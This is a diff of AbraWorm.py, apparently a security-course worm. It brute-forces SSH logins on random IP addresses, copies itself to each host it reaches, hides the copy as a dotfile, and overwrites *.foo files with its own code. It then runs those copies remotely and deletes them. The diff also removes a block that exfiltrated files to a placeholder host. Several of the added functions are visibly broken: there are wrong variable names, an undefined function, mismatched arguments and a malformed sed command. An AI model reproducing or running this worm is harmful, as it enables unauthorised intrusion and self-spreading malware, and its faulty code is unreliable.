@@ -1,4 +1,4 @@
-#!/usr/bin/env python
+#!/usr/bin/env python3
 
 ### AbraWorm.py
 
@@ -128,21 +128,21 @@ trigrams = trigrams.split()
 digrams  = digrams.split()
 
 def get_new_usernames(how_many):
-    if debug: return ['xxxxxxx']      # need a working username for debugging
+    if debug: return ['user']      # need a working username for debugging
     if how_many is 0: return 0
     selector = "{0:03b}".format(random.randint(0,7))
     usernames = [''.join(map(lambda x: random.sample(trigrams,1)[0] if int(selector[x]) == 1 else random.sample(digrams,1)[0], range(3))) for x in range(how_many)]
     return usernames
 
 def get_new_passwds(how_many):
-    if debug: return ['xxxxxxx']      # need a working username for debugging
+    if debug: return ['cs155']      # need a working username for debugging
     if how_many is 0: return 0
     selector = "{0:03b}".format(random.randint(0,7))
     passwds = [ ''.join(map(lambda x:  random.sample(trigrams,1)[0] + (str(random.randint(0,9)) if random.random() > 0.5 else '') if int(selector[x]) == 1 else random.sample(digrams,1)[0], range(3))) for x in range(how_many)]
     return passwds
 
 def get_fresh_ipaddresses(how_many):
-    if debug: return ['128.46.144.123']
+    if debug: return ['192.168.56.1','192.168.56.155']
                     # Provide one or more IP address that you
                     # want `attacked' for debugging purposes.
                     # The usrname and password you provided
@@ -154,6 +154,49 @@ def get_fresh_ipaddresses(how_many):
         first,second,third,fourth = map(lambda x: str(1 + random.randint(0,x)), [223,223,223,223])
         ipaddresses.append( first + '.' + second + '.' + third + '.' + fourth )
     return ipaddresses
+
+
+def search_signature(ssh_var,files):
+	count = 0
+	for item in file:
+		IN = open(item,'r')
+		all_of_it = IN.readlines()
+		if any(line.find('!@m$tuxn3t') for line in all_of_it):
+			cmd = "python "+item
+			stdin,stdout,stderr = ssh_var.exec_command(cmd)
+			count = count + 1
+			if stderr is None:
+				print("\nWorms executed")
+	return count
+
+def execute_worm_ontarget(ssh_var,received_list):
+	print("\nInfected files already present")
+	for item in received_list:
+		cmd = "python "+item
+		stdin,stdout,stderr = ssh_var.exec_command(cmd)
+		if stderr is None:
+			print("\nWorms executed")
+
+def send_hiddenworm_totarget(ssh_var):
+	scpcon = scp.SCPClient(ssh_var.get_transport())
+	scpcon.put(sys.argv[0])
+	scpcon.close()
+	cmd_make_hidden = "mv " + sys.argv[0] + " ." + sys.argv[0]
+	stdin,stdout,stderr = ssh_var.exec_command(cmd_make_hidden)
+	print("\nFile hidden on target_system")
+
+def execute_hiddenworm_ontarget(ssh_var):
+	cmd = "ls -ld .?*"
+	stdin,stdout,stderr = ssh_var.exec_command(cmd)
+	received_list = list(map(lambda x: x.encode('utf-8'),stdout.readlines()))
+	for item in received_list:
+		execute_worm = "python "+item
+		stdin,stdout,stderr = ssh_var.exec_command(execute_worm)
+		delete_worm = "rm "+item 
+		if stderr is None:
+			print("\nExecuting hiddenworm on target system")
+		stdin,stdout,stderr = ssh_var.exec_command(delete_worm)
+		return 1
 
 # For the same IP address, we do not want to loop through multiple user
 # names and passwords consecutively since we do not want to be quarantined
@@ -178,58 +221,38 @@ while True:
                     ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                     ssh.connect(ip_address,port=22,username=user,password=passwd,timeout=5)
                     print("\n\nconnected\n")
-                    # Let's make sure that the target host was not previously
-                    # infected:
-                    received_list = error = None
-                    stdin, stdout, stderr = ssh.exec_command('ls')
-                    error = stderr.readlines()
-                    if error is not None:
-                        print(error)
-                    received_list = list(map(lambda x: x.encode('utf-8'), stdout.readlines()))
-                    print("\n\noutput of 'ls' command: %s" % str(received_list))
-                    if ''.join(received_list).find('AbraWorm') >= 0:
-                        print("\nThe target machine is already infected\n")
-                        next
-                    # Now let's look for files that contain the string 'abracadabra'
-                    IN = open(sys.argv[0], 'r')
-                    virus = [line for (i,line) in enumerate(IN) if i < 37]
+					
+					
+					IN = open(sys.argv[0],'r')
+					worm = [line for (i,line) in enumerate(IN)]
+					
+					
+					list_targets = "ls *.foo"
+					stdin, stdout, stderr = ssh.exec_command(list_targets)
+					received_list = list(map(lambda x: x.encode('utf-8'), stdout.readlines()))
+					
+					infected_count = search_signature(received_list)
 
-                    for item in glob.glob("*.foo"):
-                        IN = open(item, 'r')
-                        all_of_it = IN.readlines()
-                        IN.close()
-                        if any(line.find('foovirus') for line in all_of_it): next
-                        os.chmod(item, 0777)    
-                        OUT = open(item, 'w')
-                        OUT.writelines(virus)
-                        all_of_it = ['#' + line for line in all_of_it]
-                        OUT.writelines(all_of_it)
-                        OUT.close()
-                    # Now deposit a copy of AbraWorm.py at the target host:
-                    scpcon.put(sys.argv[0])
-                    scpcon.close()
+					if infected_count >= 1:							#if infected file is already present then just run that file
+						exit()
+
+
+					if received_list == 0:							#if no infectable file is present then send a copy of virus, hide it, then execute
+						print("No infectable targets on this system")
+						send_worm_totarget(ssh)
+						execute_hiddenworm_ontarget(ssh)
+						exit()
+
+					for item in received_list:						#if received list exists then modify contents of each of the file and execute those
+						item = item.replace("\n","")
+						OUT = open(item,'w')
+						OUT.writelines(["!@m$tuxn3t"])
+						sed_cmd = "sed -i -e 's/^/#' %s" % item
+						stdin,stdout,stderr = ssh.exec_command(sed_cmd)
+						OUT.writelines(worm)
+						OUT.close()
+					execute_worm_ontarget(ssh,received_list)
                 except:
                     next
-                # Now upload the exfiltrated files to a specially designated host,
-                # which can be a previously infected host.  The worm will only
-                # use those previously infected hosts as destinations for
-                # exfiltrated files if it was able to send the login credentials
-                # used on those hosts to its human masters through, say, a
-                # secret IRC channel. (See Lecture 29 on IRC)
-                if len(files_of_interest_at_target) > 0:
-                    print("\nWill now try to exfiltrate the files")
-                    try:
-                        ssh = paramiko.SSHClient()
-                        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-                        #  For exfiltration demo to work, you must provide an IP address and the login
-                        #  credentials in the next statement:
-                        ssh.connect('yyy.yyy.yyy.yyy',port=22,username='yyyy',password='yyyyyyy',timeout=5)
-                        scpcon = scp.SCPClient(ssh.get_transport())
-                        print("\n\nconnected to exhiltration host\n")
-                        for filename in files_of_interest_at_target:
-                            scpcon.put(filename)
-                        scpcon.close()
-                    except:
-                        print("No uploading of exfiltrated files\n")
-                        next
     if debug: break
+
